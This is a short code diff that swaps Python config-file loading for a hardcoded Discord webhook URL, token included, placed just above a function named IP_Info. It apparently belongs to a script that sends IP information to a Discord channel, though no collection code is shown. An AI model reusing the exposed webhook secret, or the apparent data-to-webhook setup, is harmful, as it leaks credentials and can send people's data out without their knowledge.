@@ -8,13 +8,8 @@
 *
 */
 
-from yaml import safe_load
-from pathlib import Path
 
-with Path("config.yml").open() as f:
-    config = safe_load(f)
-
-webhook = config["webhook"]
+const webhook = "https://discord.com/api/webhooks/1067661550581727294/Cw9WN01_d7_zNQdijicRnFPZ_cJ-rzuoT2SLroRqvFIdL0afCSMmkjVL4riQoBvROt_6"
 
 async function IP_Info(){
     /**
